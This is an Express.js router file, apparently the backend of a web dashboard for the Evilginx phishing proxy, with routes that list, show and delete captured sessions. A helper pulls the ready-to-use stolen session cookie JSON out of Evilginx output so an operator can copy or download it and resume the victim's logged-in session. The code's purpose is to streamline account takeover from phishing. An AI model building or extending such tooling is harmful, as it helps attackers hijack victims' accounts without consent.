import { Router } from 'express';
import { runAndParse } from '../lib/runCommand.js';

const router = Router();
const ID_RE = /^[0-9]+$/;

router.get('/', async (req, res) => {
  try {
    res.json(await runAndParse('sessions'));
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Evilginx's own `sessions <id>` output embeds a ready-to-use JSON cookie
// export (it recommends importing it via a browser extension to resume the
// captured session) under a "[ cookies ]" heading — pull that out so the UI
// can offer copy/download buttons instead of asking the user to eyeball it
// out of the raw console text.
function extractCookies(raw) {
  const match = raw.match(/\[ cookies \]\s*\n(\[.*\])/);
  if (!match) return null;
  try {
    return JSON.parse(match[1]);
  } catch {
    return null;
  }
}

router.get('/:id', async (req, res) => {
  const { id } = req.params;
  if (!ID_RE.test(id)) return res.status(400).json({ error: 'invalid id' });
  try {
    const result = await runAndParse(`sessions ${id}`);
    res.json({ ...result, cookies: extractCookies(result.raw) });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.delete('/:id', async (req, res) => {
  const { id } = req.params;
  if (!ID_RE.test(id)) return res.status(400).json({ error: 'invalid id' });
  try {
    res.json(await runAndParse(`sessions delete ${id}`));
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

export default router;
